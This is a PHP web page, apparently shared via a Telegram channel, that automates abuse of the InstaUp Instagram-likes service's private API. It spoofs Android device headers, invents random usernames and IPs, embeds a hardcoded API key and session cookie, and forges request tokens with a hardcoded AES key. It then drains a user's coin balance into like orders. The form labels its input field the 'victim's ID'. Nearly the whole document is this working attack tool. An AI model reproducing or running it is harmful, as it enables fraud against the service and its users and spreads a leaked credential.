<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Black</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="instaup.png" rel="icon" type="image/x-icon"/>
  <meta name="description" content="https://t.me/pppp8ppp">
  <meta name="author" content="https://t.me/pppp8ppp">
  <meta name="keywords" content="https://t.me/pppp8ppp">
</head>
<style type="text/css">@import url('https://fonts.googleapis.com/css?family=Poppins');@import url('https://fonts.googleapis.com/css2?family=Solway&display=swap');
/* BASIC */
*{ margin: 0; padding: 0; box-sizing: border-box; font-family: "Poppins", sans-serif;}
*:focus { outline: none;} 
:root { --main-color: #ff0000; --shadow-color: rgba(93, 38, 193, 0.4);}
body { width: 100%; height: 100vh; background-image: linear-gradient(45deg, var(--main-color) 45%, #ffffff 0%); background-repeat: no-repeat; }

/* STRUCTURE */
.wrapper { width: 100%; min-height: 100%; padding: 80px 20px 20px 20px;}
/* ANIMATIONS */
/* Simple CSS3 Fade-in-down Animation */.fadeInDown { animation-name: fadeInDown; animation-duration: 2s; animation-fill-mode: both;}
@keyframes fadeInDown { 0% { opacity: 0; transform: translate3d(0, -100%, 0); } 100% { opacity: 1; transform: none; }}

#formContent { border-radius: 10px; background: #fff; width: 95%; max-width: 400px; min-height: 350px; max-height: 450px; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 30px 60px 0 rgba(0,0,0,0.3);}
#navbarId { text-align: center; }
img { width: 25%; margin: 20px auto 5px auto; padding-top: 30px; display: block;}
h2 { text-align: center; font-size: 16px; font-weight: 600; text-transform: uppercase; display: inline-block; letter-spacing: 0.4px; margin: 5px 8px 20px 8px; color: #636e72; border-bottom: 1px solid #636e72;}

h3{

   font-size: 24px;
   color: #403866;
   margin-bottom: 50px;
   font-weight: 300;
   text-transform: uppercase;
   text-align: center;
   text-shadow: 0 0px 2px rgba(0, 0, 0, 0.5);
   font-family: 'Righteous', cursive;
   letter-spacing: 1px;
}

input[type=text],select { background-color: #f6f6f6; border: none; color: #0d0d0d; padding: 12px 32px; text-align: left; text-decoration: none; display: block; font-size: 14px; margin: 5px auto; width: 85%; border: 2px solid #f6f6f6; -webkit-transition: all 0.5s ease-in-out; -moz-transition: all 0.5s ease-in-out; -ms-transition: all 0.5s ease-in-out; -o-transition: all 0.5s ease-in-out; transition: all 0.5s ease-in-out; -webkit-border-radius: 5px 5px 5px 5px; border-radius: 5px 5px 5px 5px;}
input[type=text]:focus { background-color: #fff; border-bottom: 2px solid var(--main-color);}
input[type=text]:placeholder { color: #cccccc;}

/* FORM TYPOGRAPHY*/
input[type=button], input[type=submit], input[type=reset] { background-color: var(--main-color); border: none; color: white; letter-spacing: 1px; padding: 12px 80px; text-align: center; text-decoration: none; display: block; text-transform: uppercase; font-size: 13px; -webkit-box-shadow: 0 10px 30px 0 var(--shadow-color); box-shadow: 0 10px 30px 0 var(--shadow-color); -webkit-border-radius: 5px 5px 5px 5px; border-radius: 5px 5px 5px 5px; margin: 5px auto 35px auto; -webkit-transition: all 0.3s ease-in-out; -moz-transition: all 0.3s ease-in-out; -ms-transition: all 0.3s ease-in-out; -o-transition: all 0.3s ease-in-out; transition: all 0.3s ease-in-out; cursor: pointer;}
input[type=button]:hover, input[type=submit]:hover, input[type=reset]:hover { background-color: var(--main-color);}
input[type=button]:active, input[type=submit]:active, input[type=reset]:active { -moz-transform: scale(0.95); -webkit-transform: scale(0.95); -o-transform: scale(0.95); -ms-transform: scale(0.95); transform: scale(0.95);}
/* Simple CSS3 Fade-in Animation */@-webkit-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }@-moz-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
.fadeIn { opacity:0; -webkit-animation:fadeIn ease-in 1; -moz-animation:fadeIn ease-in 1; animation:fadeIn ease-in 1;
-webkit-animation-fill-mode:forwards; -moz-animation-fill-mode:forwards; animation-fill-mode:forwards;
-webkit-animation-duration:1s; -moz-animation-duration:1s; animation-duration:1s;}
.fadeIn.first { -webkit-animation-delay: 0.4s; -moz-animation-delay: 0.4s; animation-delay: 0.4s;}
.fadeIn.second { -webkit-animation-delay: 0.6s; -moz-animation-delay: 0.6s; animation-delay: 0.6s;}
.fadeIn.third { -webkit-animation-delay: 0.8s; -moz-animation-delay: 0.8s; animation-delay: 0.8s;}
.fadeIn.fourth { -webkit-animation-delay: 1s; -moz-animation-delay: 1s; animation-delay: 1s;}

#formFooter { background-color: #f6f6f6; border-top: 1px solid #dce8f1; padding: 25px; text-align: center; border-radius: 0 0 10px 10px;}
a { color: var(--main-color); display:inline-block; text-decoration: none; font-weight: 400;}
/* Simple CSS3 Fade-in Animation */.underlineHover:after { display: block; left: 0; bottom: -10px; width: 0; height: 2px; background-color: var(--main-color); content: ""; transition: width 0.2s;}
.underlineHover:hover { color: #0d0d0d;}
.underlineHover:hover:after{ width: 100%;}
.small_text_msg { margin: 0px 0px 10px 25px; color: #636e72; font-size: 12px; display: block; text-align: left;}
.BoxContent { background-color: #f6f6f6; width: 85%; min-height: 30px; padding: 15px; margin: 5px auto 20px auto; border-radius: 5px;}
.BoxContent p { padding: 10px 0px; border-top: thin solid #ffffff; text-align: center; font-size: 12px; color: #636e72; font-family: 'Solway', serif;}
pre { font-size: 13px;}
</style>
</style>
<body>
    
    
    
    
    
    
       <div class="wrapper fadeInDown"> <div id="formContent"> <div class="fadeIn first" id="navbarId">
       <img src="instaup.png" alt="Icon"> <h2 class="active">Black </h2> </div> 
<center>
     <?php
if(isset($_GET['submit'])){
	$uidx=$_GET['o'];
    $uid=$_GET['oid'];




  function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }



  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$url1='https://instaup.marsapi.com/get_likes/user/coins';



$data0='market:PlayStore&user_id='.$uid.'&iad=de7d6788fcf061b1341cf0661af36fe35ec72647&user_name='.$name;

$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$uid);


$headers1=['Xiaomi:29:M2007J20CI',
'access: '.$access,
'lng: en',
'cnt:in',
'versionName:17.0.1',
'version:90',
'pkg:f2c6d7a5b030a1542f7eb589d5013340',
'enMarket:EnglishWebPayment',
'market:PlayStore',
'uid:'.$uid,
'api_key: ABCXYZ123TEST',
'crc:4653145854/23927768',
"Nagent:0/02:00:00:00:00:00/48/de2b83032671b409/0/de7d6788fcf061b1341cf0661af36fe35ec72647",
'dsl:36f9a8e7',
'aid:de7d6788fcf061b1341cf0661af36fe35ec72647',
'special-user:1',
'Host:instaup.marsapi.com',
'Connection:Keep-Alive',
'Accept-Encoding:gzip',
'cookie:  token=57759904674%3A9dZVITowT1CnJT%3A20%3AAYfFr_1WDg_oaEI1TpxR0hu_r7y5FuHVBqFqwN6ymQ',];


	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
	   curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	$output1= curl_exec ($ch);
	
	curl_close ($ch);

    $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $d1 = $c1 / 2;
  $d2 = explode(".",$d1)['0'];
      $url0="https://instaup.marsapi.com/get_likes/order/like";




$idx=$uid+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';

if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}


$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');






 
$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';


$data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
    if($c == 'Successful'){
echo "<div class='success'><center>
<font color='green'><hr>$output1<hr>
<font color='red'><hr>DONE : $d2<hr></font></center></div>";
} else {

echo "<div class='success'><center>
<font color='green'><hr>$output1<hr></font></center></div>
<font color='red'><hr>$cc<hr></font></center></div>";
}


	    }
	
	if(!isset($_GET['submit'])){
echo"<form action='' method='get'>
<input type='text' name='oid'  class='text' placeholder='ايدي الضحيه' required><br><br>
<input type='text' name='o'  class='text' placeholder='ايدي البوست' ><br>";

    echo "<input type='submit'
class='submit' name='submit' value='submit'>";
	}

?>

</center>

 
 </html>

<div id="formFooter">
        <a class="underlineHover" href="https://t.me/pppp8ppp">Black</a>
      </div>
      
      
      
      
      <script type="text/javascript"> var arrgetbtn=[]; arrgetbtn.push({"title":"Instagram","icon":"fwidgethelp-telegram_v2","link":"https://t.me/pppp8ppp?igshid=ZDdkNTZiNTM=","target":"_blank","color":"#FFFFFF","background":"#27A5E7"}); arrgetbtn.push({"title":"","icon":"fwidgethelp-telegram_v2","link":"https://t.me/pppp8ppp","target":"_blank","color":"#FFFFFF","background":"#cc0000"}); arrgetbtn.push({"title":"","icon":"fwidgethelp-envelope","link":"","target":"_blank","color":"#FFFFFF","background":"#ff9900"}); var WidGetButtonOptions = { id:"99d94b6d33562f7f07911780e8c72119", iconopen:"fwidgethelp-telegram_v2", maintitle:"Telegram", mainbackground:"#ff0000", maincolor:"hsv(0, 0%, 100%)", pulse:"widgethelp_pulse", fasize:"1.75", direction:"top", position:"rightbottom", arrbtn: arrgetbtn }; (function() { var script = document.createElement("script"); script.type = "text/javascript"; script.async = true; script.src = "https://getbtn.com/widget/index.php?id="+WidGetButtonOptions.id; document.getElementsByTagName("head")[0].appendChild(script); })();</script>
